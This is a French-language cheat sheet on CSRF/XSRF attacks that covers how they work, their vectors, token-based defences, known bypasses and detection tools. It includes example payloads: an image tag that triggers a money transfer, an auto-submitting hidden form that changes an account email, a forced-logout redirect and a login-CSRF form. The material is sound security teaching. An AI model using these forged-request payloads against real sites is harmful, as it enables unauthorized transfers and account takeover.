# CSRF-XSRF.md

## Cheat Sheet - CSRF (Cross-Site Request Forgery) / XSRF

Ce document détaille les attaques CSRF (ou XSRF), leurs mécanismes, exemples et défenses, à utiliser dans des environnements contrôlés et légaux uniquement.

---

## 1. Comprendre CSRF/XSRF

Une attaque CSRF exploite la confiance d’un site envers un utilisateur authentifié pour exécuter des actions non désirées via des requêtes forgées.

| **Aspect**           | **Description**                                      |
|----------------------|-----------------------------------------------------|
| **Cible**            | Actions sensibles (ex. : transferts, modifications) |
| **Condition**        | Utilisateur authentifié avec session active        |
| **Moyen**            | Requête falsifiée (GET, POST, etc.)                |
| **Impact**           | Exécution d’actions au nom de la victime           |

---

## 2. Exemples d'attaques CSRF

### Attaques via requête GET
| Exemple                                  | Description                                      |
|------------------------------------------|--------------------------------------------------|
| `<img src="http://site.com/transfer?amount=1000&to=attaquant">` | Transfert d'argent via une balise image         |
| `<a href="http://site.com/delete?user=123">Supprimer</a>` | Suppression de compte via un lien cliquable     |

### Attaques via formulaire POST
| Exemple                                  | Description                                      |
|------------------------------------------|--------------------------------------------------|
| ```html                                  | Formulaire auto-soumis via JavaScript            |
| <form action="http://site.com/update" method="POST"> |                                                  |
|   <input type="hidden" name="email" value="hacked@evil.com"> |                                       |
| </form>                                  |                                                  |
| <script>document.forms[0].submit()</script> |                                               |
| ```                                      |                                                  |

### Attaques via redirection
| Exemple                                  | Description                                      |
|------------------------------------------|--------------------------------------------------|
| `<meta http-equiv="refresh" content="0;url=http://site.com/logout">` | Déconnexion forcée via redirection         |

---

## 3. Vecteurs d’attaque courants

| **Vecteur**          | **Explication**                                      |
|----------------------|-----------------------------------------------------|
| **Balises HTML**     | `<img>`, `<iframe>` ou `<script>` avec URL malveillante |
| **Liens piégés**     | Liens cliquables envoyés par email ou chat         |
| **Formulaires cachés** | Soumission automatique via JavaScript            |
| **Requêtes AJAX**    | Exploitation de CORS mal configuré                 |

---

## 4. Préventions contre CSRF

### Mécanismes de base
| **Méthode**          | **Description**                                      |
|----------------------|-----------------------------------------------------|
| **Jeton CSRF**       | Ajouter un token unique par session ou requête     |
| **Méthode POST**     | Utiliser POST au lieu de GET pour les actions      |
| **Double soumission de cookie** | Vérifier un cookie contre un champ caché       |

### Exemples d’implémentation
| **Technique**        | **Code/Exemple**                                    |
|----------------------|----------------------------------------------------|
| **Jeton dans formulaire** | ```html                                        |
|                   | <form method="POST" action="/update">             |
|                   |   <input type="hidden" name="csrf_token" value="abcd1234"> |
|                   | </form>                                          |
|                   | ```                                              |
| **Validation serveur** | Vérifier `csrf_token` contre une valeur en session |
| **En-tête personnalisé** | Ajouter `X-CSRF-Token` dans les requêtes AJAX    |

### Contournements possibles
| **Faille**           | **Explication**                                      |
|----------------------|-----------------------------------------------------|
| **Jeton statique**   | Token réutilisable ou non unique                   |
| **CORS mal configuré** | Permet des requêtes cross-origin non protégées    |
| **Absence de validation** | Token présent mais non vérifié côté serveur      |

---

## 5. Détection de vulnérabilités CSRF

| **Test**             | **Méthode**                                         |
|----------------------|----------------------------------------------------|
| **Analyse des requêtes** | Vérifier si les actions sensibles utilisent GET ou POST sans token |
| **Outils**           | Burp Suite, OWASP ZAP (scan passif/actif)          |
| **Symptôme**         | Action réussie sans interaction explicite          |

---

## 6. Variantes avancées

### Login CSRF
| Exemple                                  | Description                                      |
|------------------------------------------|--------------------------------------------------|
| ```html                                  | Force l’utilisateur à se connecter avec un compte attaquant |
| <form action="http://site.com/login" method="POST"> |                                                |
|   <input type="hidden" name="username" value="attaquant"> |                                       |
|   <input type="hidden" name="password" value="1234"> |                                          |
| </form>                                  |                                                  |
| ```                                      |                                                  |

### CSRF + XSS
- Combiner XSS pour injecter un script qui exécute une requête CSRF dynamiquement.

---

## Précautions
- **Usage légal uniquement** : Tests dans des environnements autorisés.
- **Outils recommandés** : Burp Suite, Postman pour simuler des requêtes.
- **Standards** : Suivre les recommandations OWASP CSRF Cheat Sheet.
